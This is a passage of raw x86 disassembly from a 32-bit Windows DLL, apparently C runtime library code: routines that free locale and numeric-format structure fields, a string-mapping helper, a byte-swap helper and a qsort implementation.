100097b9:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
100097bf:	e8 95 bd ff ff       	call   0x10005559
100097c4:	33 c0                	xor    %eax,%eax
100097c6:	5d                   	pop    %ebp
100097c7:	c3                   	ret
100097c8:	8b ff                	mov    %edi,%edi
100097ca:	55                   	push   %ebp
100097cb:	8b ec                	mov    %esp,%ebp
100097cd:	56                   	push   %esi
100097ce:	8b 75 08             	mov    0x8(%ebp),%esi
100097d1:	85 f6                	test   %esi,%esi
100097d3:	0f 84 ea 00 00 00    	je     0x100098c3
100097d9:	8b 46 0c             	mov    0xc(%esi),%eax
100097dc:	3b 05 0c 37 01 10    	cmp    0x1001370c,%eax
100097e2:	74 07                	je     0x100097eb
100097e4:	50                   	push   %eax
100097e5:	e8 9c be ff ff       	call   0x10005686
100097ea:	59                   	pop    %ecx
100097eb:	8b 46 10             	mov    0x10(%esi),%eax
100097ee:	3b 05 10 37 01 10    	cmp    0x10013710,%eax
100097f4:	74 07                	je     0x100097fd
100097f6:	50                   	push   %eax
100097f7:	e8 8a be ff ff       	call   0x10005686
100097fc:	59                   	pop    %ecx
100097fd:	8b 46 14             	mov    0x14(%esi),%eax
10009800:	3b 05 14 37 01 10    	cmp    0x10013714,%eax
10009806:	74 07                	je     0x1000980f
10009808:	50                   	push   %eax
10009809:	e8 78 be ff ff       	call   0x10005686
1000980e:	59                   	pop    %ecx
1000980f:	8b 46 18             	mov    0x18(%esi),%eax
10009812:	3b 05 18 37 01 10    	cmp    0x10013718,%eax
10009818:	74 07                	je     0x10009821
1000981a:	50                   	push   %eax
1000981b:	e8 66 be ff ff       	call   0x10005686
10009820:	59                   	pop    %ecx
10009821:	8b 46 1c             	mov    0x1c(%esi),%eax
10009824:	3b 05 1c 37 01 10    	cmp    0x1001371c,%eax
1000982a:	74 07                	je     0x10009833
1000982c:	50                   	push   %eax
1000982d:	e8 54 be ff ff       	call   0x10005686
10009832:	59                   	pop    %ecx
10009833:	8b 46 20             	mov    0x20(%esi),%eax
10009836:	3b 05 20 37 01 10    	cmp    0x10013720,%eax
1000983c:	74 07                	je     0x10009845
1000983e:	50                   	push   %eax
1000983f:	e8 42 be ff ff       	call   0x10005686
10009844:	59                   	pop    %ecx
10009845:	8b 46 24             	mov    0x24(%esi),%eax
10009848:	3b 05 24 37 01 10    	cmp    0x10013724,%eax
1000984e:	74 07                	je     0x10009857
10009850:	50                   	push   %eax
10009851:	e8 30 be ff ff       	call   0x10005686
10009856:	59                   	pop    %ecx
10009857:	8b 46 38             	mov    0x38(%esi),%eax
1000985a:	3b 05 38 37 01 10    	cmp    0x10013738,%eax
10009860:	74 07                	je     0x10009869
10009862:	50                   	push   %eax
10009863:	e8 1e be ff ff       	call   0x10005686
10009868:	59                   	pop    %ecx
10009869:	8b 46 3c             	mov    0x3c(%esi),%eax
1000986c:	3b 05 3c 37 01 10    	cmp    0x1001373c,%eax
10009872:	74 07                	je     0x1000987b
10009874:	50                   	push   %eax
10009875:	e8 0c be ff ff       	call   0x10005686
1000987a:	59                   	pop    %ecx
1000987b:	8b 46 40             	mov    0x40(%esi),%eax
1000987e:	3b 05 40 37 01 10    	cmp    0x10013740,%eax
10009884:	74 07                	je     0x1000988d
10009886:	50                   	push   %eax
10009887:	e8 fa bd ff ff       	call   0x10005686
1000988c:	59                   	pop    %ecx
1000988d:	8b 46 44             	mov    0x44(%esi),%eax
10009890:	3b 05 44 37 01 10    	cmp    0x10013744,%eax
10009896:	74 07                	je     0x1000989f
10009898:	50                   	push   %eax
10009899:	e8 e8 bd ff ff       	call   0x10005686
1000989e:	59                   	pop    %ecx
1000989f:	8b 46 48             	mov    0x48(%esi),%eax
100098a2:	3b 05 48 37 01 10    	cmp    0x10013748,%eax
100098a8:	74 07                	je     0x100098b1
100098aa:	50                   	push   %eax
100098ab:	e8 d6 bd ff ff       	call   0x10005686
100098b0:	59                   	pop    %ecx
100098b1:	8b 46 4c             	mov    0x4c(%esi),%eax
100098b4:	3b 05 4c 37 01 10    	cmp    0x1001374c,%eax
100098ba:	74 07                	je     0x100098c3
100098bc:	50                   	push   %eax
100098bd:	e8 c4 bd ff ff       	call   0x10005686
100098c2:	59                   	pop    %ecx
100098c3:	5e                   	pop    %esi
100098c4:	5d                   	pop    %ebp
100098c5:	c3                   	ret
100098c6:	8b ff                	mov    %edi,%edi
100098c8:	55                   	push   %ebp
100098c9:	8b ec                	mov    %esp,%ebp
100098cb:	56                   	push   %esi
100098cc:	8b 75 08             	mov    0x8(%ebp),%esi
100098cf:	85 f6                	test   %esi,%esi
100098d1:	74 59                	je     0x1000992c
100098d3:	8b 06                	mov    (%esi),%eax
100098d5:	3b 05 00 37 01 10    	cmp    0x10013700,%eax
100098db:	74 07                	je     0x100098e4
100098dd:	50                   	push   %eax
100098de:	e8 a3 bd ff ff       	call   0x10005686
100098e3:	59                   	pop    %ecx
100098e4:	8b 46 04             	mov    0x4(%esi),%eax
100098e7:	3b 05 04 37 01 10    	cmp    0x10013704,%eax
100098ed:	74 07                	je     0x100098f6
100098ef:	50                   	push   %eax
100098f0:	e8 91 bd ff ff       	call   0x10005686
100098f5:	59                   	pop    %ecx
100098f6:	8b 46 08             	mov    0x8(%esi),%eax
100098f9:	3b 05 08 37 01 10    	cmp    0x10013708,%eax
100098ff:	74 07                	je     0x10009908
10009901:	50                   	push   %eax
10009902:	e8 7f bd ff ff       	call   0x10005686
10009907:	59                   	pop    %ecx
10009908:	8b 46 30             	mov    0x30(%esi),%eax
1000990b:	3b 05 30 37 01 10    	cmp    0x10013730,%eax
10009911:	74 07                	je     0x1000991a
10009913:	50                   	push   %eax
10009914:	e8 6d bd ff ff       	call   0x10005686
10009919:	59                   	pop    %ecx
1000991a:	8b 46 34             	mov    0x34(%esi),%eax
1000991d:	3b 05 34 37 01 10    	cmp    0x10013734,%eax
10009923:	74 07                	je     0x1000992c
10009925:	50                   	push   %eax
10009926:	e8 5b bd ff ff       	call   0x10005686
1000992b:	59                   	pop    %ecx
1000992c:	5e                   	pop    %esi
1000992d:	5d                   	pop    %ebp
1000992e:	c3                   	ret
1000992f:	8b ff                	mov    %edi,%edi
10009931:	55                   	push   %ebp
10009932:	8b ec                	mov    %esp,%ebp
10009934:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10009937:	53                   	push   %ebx
10009938:	56                   	push   %esi
10009939:	8b 75 08             	mov    0x8(%ebp),%esi
1000993c:	57                   	push   %edi
1000993d:	33 ff                	xor    %edi,%edi
1000993f:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
10009942:	81 e1 ff ff ff 3f    	and    $0x3fffffff,%ecx
10009948:	3b c6                	cmp    %esi,%eax
1000994a:	1b db                	sbb    %ebx,%ebx
1000994c:	f7 d3                	not    %ebx
1000994e:	23 d9                	and    %ecx,%ebx
10009950:	74 10                	je     0x10009962
10009952:	ff 36                	push   (%esi)
10009954:	e8 2d bd ff ff       	call   0x10005686
10009959:	47                   	inc    %edi
1000995a:	8d 76 04             	lea    0x4(%esi),%esi
1000995d:	59                   	pop    %ecx
1000995e:	3b fb                	cmp    %ebx,%edi
10009960:	75 f0                	jne    0x10009952
10009962:	5f                   	pop    %edi
10009963:	5e                   	pop    %esi
10009964:	5b                   	pop    %ebx
10009965:	5d                   	pop    %ebp
10009966:	c3                   	ret
10009967:	8b ff                	mov    %edi,%edi
10009969:	55                   	push   %ebp
1000996a:	8b ec                	mov    %esp,%ebp
1000996c:	56                   	push   %esi
1000996d:	8b 75 08             	mov    0x8(%ebp),%esi
10009970:	85 f6                	test   %esi,%esi
10009972:	0f 84 d0 00 00 00    	je     0x10009a48
10009978:	6a 07                	push   $0x7
1000997a:	56                   	push   %esi
1000997b:	e8 af ff ff ff       	call   0x1000992f
10009980:	8d 46 1c             	lea    0x1c(%esi),%eax
10009983:	6a 07                	push   $0x7
10009985:	50                   	push   %eax
10009986:	e8 a4 ff ff ff       	call   0x1000992f
1000998b:	8d 46 38             	lea    0x38(%esi),%eax
1000998e:	6a 0c                	push   $0xc
10009990:	50                   	push   %eax
10009991:	e8 99 ff ff ff       	call   0x1000992f
10009996:	8d 46 68             	lea    0x68(%esi),%eax
10009999:	6a 0c                	push   $0xc
1000999b:	50                   	push   %eax
1000999c:	e8 8e ff ff ff       	call   0x1000992f
100099a1:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
100099a7:	6a 02                	push   $0x2
100099a9:	50                   	push   %eax
100099aa:	e8 80 ff ff ff       	call   0x1000992f
100099af:	ff b6 a0 00 00 00    	push   0xa0(%esi)
100099b5:	e8 cc bc ff ff       	call   0x10005686
100099ba:	ff b6 a4 00 00 00    	push   0xa4(%esi)
100099c0:	e8 c1 bc ff ff       	call   0x10005686
100099c5:	ff b6 a8 00 00 00    	push   0xa8(%esi)
100099cb:	e8 b6 bc ff ff       	call   0x10005686
100099d0:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
100099d6:	6a 07                	push   $0x7
100099d8:	50                   	push   %eax
100099d9:	e8 51 ff ff ff       	call   0x1000992f
100099de:	8d 86 d0 00 00 00    	lea    0xd0(%esi),%eax
100099e4:	6a 07                	push   $0x7
100099e6:	50                   	push   %eax
100099e7:	e8 43 ff ff ff       	call   0x1000992f
100099ec:	83 c4 44             	add    $0x44,%esp
100099ef:	8d 86 ec 00 00 00    	lea    0xec(%esi),%eax
100099f5:	6a 0c                	push   $0xc
100099f7:	50                   	push   %eax
100099f8:	e8 32 ff ff ff       	call   0x1000992f
100099fd:	8d 86 1c 01 00 00    	lea    0x11c(%esi),%eax
10009a03:	6a 0c                	push   $0xc
10009a05:	50                   	push   %eax
10009a06:	e8 24 ff ff ff       	call   0x1000992f
10009a0b:	8d 86 4c 01 00 00    	lea    0x14c(%esi),%eax
10009a11:	6a 02                	push   $0x2
10009a13:	50                   	push   %eax
10009a14:	e8 16 ff ff ff       	call   0x1000992f
10009a19:	ff b6 54 01 00 00    	push   0x154(%esi)
10009a1f:	e8 62 bc ff ff       	call   0x10005686
10009a24:	ff b6 58 01 00 00    	push   0x158(%esi)
10009a2a:	e8 57 bc ff ff       	call   0x10005686
10009a2f:	ff b6 5c 01 00 00    	push   0x15c(%esi)
10009a35:	e8 4c bc ff ff       	call   0x10005686
10009a3a:	ff b6 60 01 00 00    	push   0x160(%esi)
10009a40:	e8 41 bc ff ff       	call   0x10005686
10009a45:	83 c4 28             	add    $0x28,%esp
10009a48:	5e                   	pop    %esi
10009a49:	5d                   	pop    %ebp
10009a4a:	c3                   	ret
10009a4b:	8b ff                	mov    %edi,%edi
10009a4d:	55                   	push   %ebp
10009a4e:	8b ec                	mov    %esp,%ebp
10009a50:	83 ec 1c             	sub    $0x1c,%esp
10009a53:	a1 04 30 01 10       	mov    0x10013004,%eax
10009a58:	33 c5                	xor    %ebp,%eax
10009a5a:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009a5d:	53                   	push   %ebx
10009a5e:	56                   	push   %esi
10009a5f:	57                   	push   %edi
10009a60:	ff 75 08             	push   0x8(%ebp)
10009a63:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
10009a66:	e8 75 a8 ff ff       	call   0x100042e0
10009a6b:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
10009a6e:	85 db                	test   %ebx,%ebx
10009a70:	75 06                	jne    0x10009a78
10009a72:	8b 45 e8             	mov    -0x18(%ebp),%eax
10009a75:	8b 58 08             	mov    0x8(%eax),%ebx
10009a78:	33 c0                	xor    %eax,%eax
10009a7a:	33 ff                	xor    %edi,%edi
10009a7c:	39 45 20             	cmp    %eax,0x20(%ebp)
10009a7f:	57                   	push   %edi
10009a80:	57                   	push   %edi
10009a81:	ff 75 14             	push   0x14(%ebp)
10009a84:	0f 95 c0             	setne  %al
10009a87:	ff 75 10             	push   0x10(%ebp)
10009a8a:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
10009a91:	50                   	push   %eax
10009a92:	53                   	push   %ebx
10009a93:	e8 6e e1 ff ff       	call   0x10007c06
10009a98:	83 c4 18             	add    $0x18,%esp
10009a9b:	89 45 f4             	mov    %eax,-0xc(%ebp)
10009a9e:	85 c0                	test   %eax,%eax
10009aa0:	0f 84 84 00 00 00    	je     0x10009b2a
10009aa6:	8d 14 00             	lea    (%eax,%eax,1),%edx
10009aa9:	8d 4a 08             	lea    0x8(%edx),%ecx
10009aac:	89 55 f8             	mov    %edx,-0x8(%ebp)
10009aaf:	3b d1                	cmp    %ecx,%edx
10009ab1:	1b c0                	sbb    %eax,%eax
10009ab3:	23 c1                	and    %ecx,%eax
10009ab5:	74 35                	je     0x10009aec
10009ab7:	3d 00 04 00 00       	cmp    $0x400,%eax
10009abc:	77 13                	ja     0x10009ad1
10009abe:	e8 cd 2f 00 00       	call   0x1000ca90
10009ac3:	8b f4                	mov    %esp,%esi
10009ac5:	85 f6                	test   %esi,%esi
10009ac7:	74 1e                	je     0x10009ae7
10009ac9:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
10009acf:	eb 13                	jmp    0x10009ae4
10009ad1:	50                   	push   %eax
10009ad2:	e8 8d c5 ff ff       	call   0x10006064
10009ad7:	8b f0                	mov    %eax,%esi
10009ad9:	59                   	pop    %ecx
10009ada:	85 f6                	test   %esi,%esi
10009adc:	74 09                	je     0x10009ae7
10009ade:	c7 06 dd dd 00 00    	movl   $0xdddd,(%esi)
10009ae4:	83 c6 08             	add    $0x8,%esi
10009ae7:	8b 55 f8             	mov    -0x8(%ebp),%edx
10009aea:	eb 02                	jmp    0x10009aee
10009aec:	8b f7                	mov    %edi,%esi
10009aee:	85 f6                	test   %esi,%esi
10009af0:	74 31                	je     0x10009b23
10009af2:	52                   	push   %edx
10009af3:	57                   	push   %edi
10009af4:	56                   	push   %esi
10009af5:	e8 56 92 ff ff       	call   0x10002d50
10009afa:	ff 75 f4             	push   -0xc(%ebp)
10009afd:	56                   	push   %esi
10009afe:	ff 75 14             	push   0x14(%ebp)
10009b01:	ff 75 10             	push   0x10(%ebp)
10009b04:	6a 01                	push   $0x1
10009b06:	53                   	push   %ebx
10009b07:	e8 fa e0 ff ff       	call   0x10007c06
10009b0c:	83 c4 24             	add    $0x24,%esp
10009b0f:	85 c0                	test   %eax,%eax
10009b11:	74 10                	je     0x10009b23
10009b13:	ff 75 18             	push   0x18(%ebp)
10009b16:	50                   	push   %eax
10009b17:	56                   	push   %esi
10009b18:	ff 75 0c             	push   0xc(%ebp)
10009b1b:	ff 15 14 d0 00 10    	call   *0x1000d014
10009b21:	8b f8                	mov    %eax,%edi
10009b23:	56                   	push   %esi
10009b24:	e8 25 00 00 00       	call   0x10009b4e
10009b29:	59                   	pop    %ecx
10009b2a:	80 7d f0 00          	cmpb   $0x0,-0x10(%ebp)
10009b2e:	74 0a                	je     0x10009b3a
10009b30:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10009b33:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
10009b3a:	8b c7                	mov    %edi,%eax
10009b3c:	8d 65 d8             	lea    -0x28(%ebp),%esp
10009b3f:	5f                   	pop    %edi
10009b40:	5e                   	pop    %esi
10009b41:	5b                   	pop    %ebx
10009b42:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10009b45:	33 cd                	xor    %ebp,%ecx
10009b47:	e8 3d 81 ff ff       	call   0x10001c89
10009b4c:	c9                   	leave
10009b4d:	c3                   	ret
10009b4e:	8b ff                	mov    %edi,%edi
10009b50:	55                   	push   %ebp
10009b51:	8b ec                	mov    %esp,%ebp
10009b53:	8b 45 08             	mov    0x8(%ebp),%eax
10009b56:	85 c0                	test   %eax,%eax
10009b58:	74 12                	je     0x10009b6c
10009b5a:	83 e8 08             	sub    $0x8,%eax
10009b5d:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
10009b63:	75 07                	jne    0x10009b6c
10009b65:	50                   	push   %eax
10009b66:	e8 1b bb ff ff       	call   0x10005686
10009b6b:	59                   	pop    %ecx
10009b6c:	5d                   	pop    %ebp
10009b6d:	c3                   	ret
10009b6e:	cc                   	int3
10009b6f:	cc                   	int3
10009b70:	8b ff                	mov    %edi,%edi
10009b72:	55                   	push   %ebp
10009b73:	8b ec                	mov    %esp,%ebp
10009b75:	8b 45 0c             	mov    0xc(%ebp),%eax
10009b78:	57                   	push   %edi
10009b79:	8b 7d 08             	mov    0x8(%ebp),%edi
10009b7c:	3b f8                	cmp    %eax,%edi
10009b7e:	74 26                	je     0x10009ba6
10009b80:	56                   	push   %esi
10009b81:	8b 75 10             	mov    0x10(%ebp),%esi
10009b84:	85 f6                	test   %esi,%esi
10009b86:	74 1d                	je     0x10009ba5
10009b88:	2b f8                	sub    %eax,%edi
10009b8a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
10009b90:	8a 08                	mov    (%eax),%cl
10009b92:	8d 40 01             	lea    0x1(%eax),%eax
10009b95:	8a 54 07 ff          	mov    -0x1(%edi,%eax,1),%dl
10009b99:	88 4c 07 ff          	mov    %cl,-0x1(%edi,%eax,1)
10009b9d:	88 50 ff             	mov    %dl,-0x1(%eax)
10009ba0:	83 ee 01             	sub    $0x1,%esi
10009ba3:	75 eb                	jne    0x10009b90
10009ba5:	5e                   	pop    %esi
10009ba6:	5f                   	pop    %edi
10009ba7:	5d                   	pop    %ebp
10009ba8:	c3                   	ret
10009ba9:	cc                   	int3
10009baa:	cc                   	int3
10009bab:	cc                   	int3
10009bac:	cc                   	int3
10009bad:	cc                   	int3
10009bae:	cc                   	int3
10009baf:	cc                   	int3
10009bb0:	8b ff                	mov    %edi,%edi
10009bb2:	55                   	push   %ebp
10009bb3:	8b ec                	mov    %esp,%ebp
10009bb5:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
10009bbb:	a1 04 30 01 10       	mov    0x10013004,%eax
10009bc0:	33 c5                	xor    %ebp,%eax
10009bc2:	89 45 fc             	mov    %eax,-0x4(%ebp)
10009bc5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10009bc8:	53                   	push   %ebx
10009bc9:	8b 5d 14             	mov    0x14(%ebp),%ebx
10009bcc:	56                   	push   %esi
10009bcd:	8b 75 08             	mov    0x8(%ebp),%esi
10009bd0:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
10009bd6:	89 9d f8 fe ff ff    	mov    %ebx,-0x108(%ebp)
10009bdc:	57                   	push   %edi
10009bdd:	8b 7d 10             	mov    0x10(%ebp),%edi
10009be0:	89 bd 00 ff ff ff    	mov    %edi,-0x100(%ebp)
10009be6:	85 f6                	test   %esi,%esi
10009be8:	75 25                	jne    0x10009c0f
10009bea:	85 c9                	test   %ecx,%ecx
10009bec:	74 21                	je     0x10009c0f
10009bee:	e8 23 ba ff ff       	call   0x10005616
10009bf3:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
10009bf9:	e8 5b b9 ff ff       	call   0x10005559
10009bfe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10009c01:	5f                   	pop    %edi
10009c02:	5e                   	pop    %esi
10009c03:	33 cd                	xor    %ebp,%ecx
10009c05:	5b                   	pop    %ebx
10009c06:	e8 7e 80 ff ff       	call   0x10001c89
10009c0b:	8b e5                	mov    %ebp,%esp
10009c0d:	5d                   	pop    %ebp
10009c0e:	c3                   	ret
10009c0f:	85 ff                	test   %edi,%edi
10009c11:	74 db                	je     0x10009bee
10009c13:	85 db                	test   %ebx,%ebx
10009c15:	74 d7                	je     0x10009bee
10009c17:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
10009c1e:	00 00 00 
10009c21:	83 f9 02             	cmp    $0x2,%ecx
10009c24:	72 d8                	jb     0x10009bfe
10009c26:	49                   	dec    %ecx
10009c27:	0f af cf             	imul   %edi,%ecx
10009c2a:	03 ce                	add    %esi,%ecx
10009c2c:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
10009c32:	8b c1                	mov    %ecx,%eax
10009c34:	33 d2                	xor    %edx,%edx
10009c36:	2b c6                	sub    %esi,%eax
10009c38:	f7 f7                	div    %edi
10009c3a:	8d 78 01             	lea    0x1(%eax),%edi
10009c3d:	83 ff 08             	cmp    $0x8,%edi
10009c40:	0f 87 dc 00 00 00    	ja     0x10009d22
10009c46:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
10009c4c:	3b ce                	cmp    %esi,%ecx
10009c4e:	0f 86 a1 00 00 00    	jbe    0x10009cf5
10009c54:	8d 14 37             	lea    (%edi,%esi,1),%edx
10009c57:	89 95 ec fe ff ff    	mov    %edx,-0x114(%ebp)
10009c5d:	8d 49 00             	lea    0x0(%ecx),%ecx
10009c60:	8b c6                	mov    %esi,%eax
10009c62:	8b f2                	mov    %edx,%esi
10009c64:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009c6a:	3b f1                	cmp    %ecx,%esi
10009c6c:	77 31                	ja     0x10009c9f
10009c6e:	8b ff                	mov    %edi,%edi
10009c70:	50                   	push   %eax
10009c71:	56                   	push   %esi
10009c72:	8b cb                	mov    %ebx,%ecx
10009c74:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009c7a:	ff d3                	call   *%ebx
10009c7c:	83 c4 08             	add    $0x8,%esp
10009c7f:	85 c0                	test   %eax,%eax
10009c81:	7e 0a                	jle    0x10009c8d
10009c83:	8b c6                	mov    %esi,%eax
10009c85:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009c8b:	eb 06                	jmp    0x10009c93
10009c8d:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009c93:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
10009c99:	03 f7                	add    %edi,%esi
10009c9b:	3b f1                	cmp    %ecx,%esi
10009c9d:	76 d1                	jbe    0x10009c70
10009c9f:	8b d1                	mov    %ecx,%edx
10009ca1:	3b c1                	cmp    %ecx,%eax
10009ca3:	74 34                	je     0x10009cd9
10009ca5:	2b c1                	sub    %ecx,%eax
10009ca7:	8b df                	mov    %edi,%ebx
10009ca9:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009caf:	90                   	nop
10009cb0:	8a 0c 10             	mov    (%eax,%edx,1),%cl
10009cb3:	8d 52 01             	lea    0x1(%edx),%edx
10009cb6:	8b b5 08 ff ff ff    	mov    -0xf8(%ebp),%esi
10009cbc:	8a 42 ff             	mov    -0x1(%edx),%al
10009cbf:	88 44 16 ff          	mov    %al,-0x1(%esi,%edx,1)
10009cc3:	8b c6                	mov    %esi,%eax
10009cc5:	88 4a ff             	mov    %cl,-0x1(%edx)
10009cc8:	83 eb 01             	sub    $0x1,%ebx
10009ccb:	75 e3                	jne    0x10009cb0
10009ccd:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
10009cd3:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
10009cd9:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
10009cdf:	2b cf                	sub    %edi,%ecx
10009ce1:	8b 95 ec fe ff ff    	mov    -0x114(%ebp),%edx
10009ce7:	89 8d 04 ff ff ff    	mov    %ecx,-0xfc(%ebp)
10009ced:	3b ce                	cmp    %esi,%ecx
10009cef:	0f 87 6b ff ff ff    	ja     0x10009c60
10009cf5:	8b 8d f4 fe ff ff    	mov    -0x10c(%ebp),%ecx
10009cfb:	8b c1                	mov    %ecx,%eax
10009cfd:	49                   	dec    %ecx
10009cfe:	89 8d f4 fe ff ff    	mov    %ecx,-0x10c(%ebp)
10009d04:	85 c0                	test   %eax,%eax
10009d06:	0f 8e f2 fe ff ff    	jle    0x10009bfe
10009d0c:	8b 74 8d 84          	mov    -0x7c(%ebp,%ecx,4),%esi
10009d10:	8b 8c 8d 0c ff ff ff 	mov    -0xf4(%ebp,%ecx,4),%ecx
10009d17:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
10009d1d:	e9 0a ff ff ff       	jmp    0x10009c2c
10009d22:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
10009d28:	8b cb                	mov    %ebx,%ecx
10009d2a:	8b 85 fc fe ff ff    	mov    -0x104(%ebp),%eax
10009d30:	d1 ef                	shr    $1,%edi
10009d32:	0f af fe             	imul   %esi,%edi
10009d35:	03 f8                	add    %eax,%edi
10009d37:	57                   	push   %edi
10009d38:	50                   	push   %eax
10009d39:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009d3f:	ff d3                	call   *%ebx
10009d41:	83 c4 08             	add    $0x8,%esp
10009d44:	85 c0                	test   %eax,%eax
10009d46:	7e 10                	jle    0x10009d58
10009d48:	56                   	push   %esi
10009d49:	57                   	push   %edi
10009d4a:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
10009d50:	e8 1b fe ff ff       	call   0x10009b70
10009d55:	83 c4 0c             	add    $0xc,%esp
10009d58:	ff b5 04 ff ff ff    	push   -0xfc(%ebp)
10009d5e:	8b cb                	mov    %ebx,%ecx
10009d60:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
10009d66:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009d6c:	ff d3                	call   *%ebx
10009d6e:	83 c4 08             	add    $0x8,%esp
10009d71:	85 c0                	test   %eax,%eax
10009d73:	7e 15                	jle    0x10009d8a
10009d75:	56                   	push   %esi
10009d76:	ff b5 04 ff ff ff    	push   -0xfc(%ebp)
10009d7c:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
10009d82:	e8 e9 fd ff ff       	call   0x10009b70
10009d87:	83 c4 0c             	add    $0xc,%esp
10009d8a:	ff b5 04 ff ff ff    	push   -0xfc(%ebp)
10009d90:	8b cb                	mov    %ebx,%ecx
10009d92:	57                   	push   %edi
10009d93:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009d99:	ff d3                	call   *%ebx
10009d9b:	83 c4 08             	add    $0x8,%esp
10009d9e:	85 c0                	test   %eax,%eax
10009da0:	7e 10                	jle    0x10009db2
10009da2:	56                   	push   %esi
10009da3:	ff b5 04 ff ff ff    	push   -0xfc(%ebp)
10009da9:	57                   	push   %edi
10009daa:	e8 c1 fd ff ff       	call   0x10009b70
10009daf:	83 c4 0c             	add    $0xc,%esp
10009db2:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
10009db8:	8b d8                	mov    %eax,%ebx
10009dba:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
10009dc0:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009dc6:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009dcc:	8d 64 24 00          	lea    0x0(%esp),%esp
10009dd0:	3b fe                	cmp    %esi,%edi
10009dd2:	76 37                	jbe    0x10009e0b
10009dd4:	03 f2                	add    %edx,%esi
10009dd6:	89 b5 f0 fe ff ff    	mov    %esi,-0x110(%ebp)
10009ddc:	3b f7                	cmp    %edi,%esi
10009dde:	73 25                	jae    0x10009e05
10009de0:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
10009de6:	57                   	push   %edi
10009de7:	56                   	push   %esi
10009de8:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009dee:	ff 95 f8 fe ff ff    	call   *-0x108(%ebp)
10009df4:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009dfa:	83 c4 08             	add    $0x8,%esp
10009dfd:	85 c0                	test   %eax,%eax
10009dff:	7e d3                	jle    0x10009dd4
10009e01:	3b fe                	cmp    %esi,%edi
10009e03:	77 3d                	ja     0x10009e42
10009e05:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
10009e0b:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
10009e11:	03 f2                	add    %edx,%esi
10009e13:	3b f0                	cmp    %eax,%esi
10009e15:	77 1f                	ja     0x10009e36
10009e17:	57                   	push   %edi
10009e18:	56                   	push   %esi
10009e19:	8b cb                	mov    %ebx,%ecx
10009e1b:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009e21:	ff d3                	call   *%ebx
10009e23:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009e29:	83 c4 08             	add    $0x8,%esp
10009e2c:	85 c0                	test   %eax,%eax
10009e2e:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
10009e34:	7e db                	jle    0x10009e11
10009e36:	8b 9d 08 ff ff ff    	mov    -0xf8(%ebp),%ebx
10009e3c:	89 b5 f0 fe ff ff    	mov    %esi,-0x110(%ebp)
10009e42:	8b b5 f8 fe ff ff    	mov    -0x108(%ebp),%esi
10009e48:	eb 06                	jmp    0x10009e50
10009e4a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
10009e50:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009e56:	8b c3                	mov    %ebx,%eax
10009e58:	2b da                	sub    %edx,%ebx
10009e5a:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009e60:	3b df                	cmp    %edi,%ebx
10009e62:	76 1f                	jbe    0x10009e83
10009e64:	57                   	push   %edi
10009e65:	53                   	push   %ebx
10009e66:	8b ce                	mov    %esi,%ecx
10009e68:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009e6e:	ff d6                	call   *%esi
10009e70:	83 c4 08             	add    $0x8,%esp
10009e73:	85 c0                	test   %eax,%eax
10009e75:	7f d9                	jg     0x10009e50
10009e77:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009e7d:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009e83:	8b b5 f0 fe ff ff    	mov    -0x110(%ebp),%esi
10009e89:	89 9d 08 ff ff ff    	mov    %ebx,-0xf8(%ebp)
10009e8f:	3b de                	cmp    %esi,%ebx
